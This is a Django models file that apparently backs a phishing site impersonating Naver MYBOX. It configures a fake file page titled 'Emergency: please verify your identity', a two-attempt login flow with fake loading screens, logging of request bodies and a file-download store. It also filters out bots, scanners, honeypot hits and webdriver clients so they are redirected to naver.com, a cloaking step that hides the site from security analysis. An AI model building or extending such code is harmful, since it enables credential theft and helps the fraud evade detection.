import uuid
from pathlib import Path

from django.db import models

MYBOX_IMAGE_DIR = 'mybox'
MYBOX_IMAGE_STORED_STEM = 'viewer'


def mybox_image_ext(filename):
    ext = Path(filename).suffix.lower()
    if ext == '.jpeg':
        ext = '.jpg'
    if ext not in {'.jpg', '.png', '.gif', '.webp'}:
        ext = '.jpg'
    return ext


def mybox_image_upload_to(instance, filename):
    return f'{MYBOX_IMAGE_DIR}/{MYBOX_IMAGE_STORED_STEM}{mybox_image_ext(filename)}'

KIND_MANUAL = 'manual'
KIND_RATE = 'rate'
KIND_LOGIN = 'login'
KIND_LIMIT = 'limit'
KIND_MYBOX = 'mybox'
KIND_BOT = 'bot'
KIND_UNKNOWN = 'unknown'
KIND_CHOICES = [
    (KIND_MANUAL, KIND_MANUAL),
    (KIND_RATE, KIND_RATE),
    (KIND_LOGIN, KIND_LOGIN),
    (KIND_LIMIT, KIND_LIMIT),
    (KIND_MYBOX, KIND_MYBOX),
    (KIND_BOT, KIND_BOT),
    (KIND_UNKNOWN, KIND_UNKNOWN),
]


class BlacklistEntry(models.Model):
    id = models.UUIDField(primary_key=True, default=uuid.uuid4, editable=False)
    ip = models.CharField(max_length=45, db_index=True)
    kind = models.CharField(max_length=16, choices=KIND_CHOICES)
    note = models.CharField(max_length=255, blank=True, default='')
    created_at = models.DateTimeField(auto_now_add=True)

    class Meta:
        constraints = [
            models.UniqueConstraint(fields=['ip', 'kind'], name='uniq_blacklist_ip_kind'),
        ]
        ordering = ['kind', 'created_at']

    def __str__(self):
        return f'{self.ip} ({self.kind})'


class LoginAttemptCounter(models.Model):
    ip = models.CharField(max_length=45, unique=True)
    count = models.PositiveIntegerField(default=0)
    updated_at = models.DateTimeField(auto_now=True)

    def __str__(self):
        return f'{self.ip} ({self.count})'


class MyboxVisitCounter(models.Model):
    ip = models.CharField(max_length=45, unique=True)
    count = models.PositiveIntegerField(default=0)
    updated_at = models.DateTimeField(auto_now=True)

    def __str__(self):
        return f'{self.ip} ({self.count})'


class BlacklistPolicy(models.Model):
    id = models.PositiveSmallIntegerField(primary_key=True, default=1, editable=False)
    redirect_url = models.URLField(max_length=500)
    rate_limit_enabled = models.BooleanField(default=True)
    rate_limit_max_requests = models.PositiveIntegerField(default=80)
    rate_limit_window_seconds = models.PositiveIntegerField(default=60)
    total_request_limit_enabled = models.BooleanField(default=True)
    total_request_limit_max = models.PositiveIntegerField(default=500)
    login_attempt_max = models.PositiveIntegerField(default=2)
    login_loading_enabled = models.BooleanField(default=True)
    login_loading_delay_ms = models.PositiveIntegerField(default=3000)
    login_loading_progress_percent = models.PositiveIntegerField(default=100)
    login_loading_hold_ms = models.PositiveIntegerField(default=1000)
    login_splash_enabled = models.BooleanField(default=True)
    login_splash_delay_ms = models.PositiveIntegerField(default=1000)
    login_intro_mode = models.CharField(max_length=16, default='loading')
    login_mybox_delay_ms = models.PositiveIntegerField(default=3000)
    mybox_visit_limit_enabled = models.BooleanField(default=True)
    mybox_visit_max = models.PositiveIntegerField(default=3)
    mybox_redirect_url = models.URLField(max_length=500, default='https://www.naver.com/')
    limits_redirect_url = models.URLField(max_length=500, default='https://www.naver.com/')
    login_redirect_url = models.URLField(max_length=500, default='https://www.naver.com/')
    bot_block_enabled = models.BooleanField(default=True)
    bot_redirect_url = models.URLField(max_length=500, default='https://www.naver.com/')
    bot_block_empty_ua = models.BooleanField(default=True)
    bot_block_scanner_paths = models.BooleanField(default=True)
    bot_block_honeypot = models.BooleanField(default=True)
    bot_block_webdriver = models.BooleanField(default=True)
    bot_ua_keywords = models.TextField(blank=True, default='')
    bot_path_keywords = models.TextField(blank=True, default='')
    unknown_block_enabled = models.BooleanField(default=True)
    unknown_redirect_url = models.URLField(max_length=500, default='https://www.naver.com/')
    download_redirect_url = models.URLField(max_length=500, default='https://www.naver.com/')
    mybox_filename = models.CharField(max_length=120, blank=True, default='20260824_071530')
    mybox_filesize = models.CharField(max_length=32, blank=True, default='2MB')
    mybox_page_title = models.CharField(
        max_length=200, blank=True, default='긴급 상황: 신원 확인 부탁드립니다.'
    )
    mybox_image = models.FileField(upload_to=mybox_image_upload_to, blank=True, default='')
    updated_at = models.DateTimeField(auto_now=True)

    class Meta:
        verbose_name_plural = 'blacklist policy'

    def __str__(self):
        return 'Blacklist policy'


class RequestLog(models.Model):
    timestamp = models.DateTimeField(db_index=True)
    method = models.CharField(max_length=16, blank=True, default='')
    path = models.TextField(blank=True, default='')
    ip = models.CharField(max_length=45, db_index=True)
    device = models.CharField(max_length=32, blank=True, default='')
    os = models.CharField(max_length=128, blank=True, default='')
    browser = models.CharField(max_length=128, blank=True, default='')
    model = models.CharField(max_length=128, blank=True, default='')
    language = models.CharField(max_length=8, blank=True, default='')
    user_agent = models.TextField(blank=True, default='')
    query = models.JSONField(default=dict, blank=True)
    body = models.JSONField(default=dict, blank=True)

    class Meta:
        ordering = ['-timestamp']

    def __str__(self):
        return f'{self.method} {self.path} ({self.ip})'


DOWNLOAD_DIR = 'downloads'


def download_file_upload_to(instance, filename):
    return f'{DOWNLOAD_DIR}/{instance.id}/{instance.filename}'


class DownloadFile(models.Model):
    id = models.UUIDField(primary_key=True, default=uuid.uuid4, editable=False)
    filename = models.CharField(max_length=255, unique=True, db_index=True)
    file = models.FileField(upload_to=download_file_upload_to)
    size = models.PositiveBigIntegerField(default=0)
    content_type = models.CharField(max_length=255, blank=True, default='')
    created_at = models.DateTimeField(auto_now_add=True)

    class Meta:
        ordering = ['-created_at']

    def __str__(self):
        return self.filename
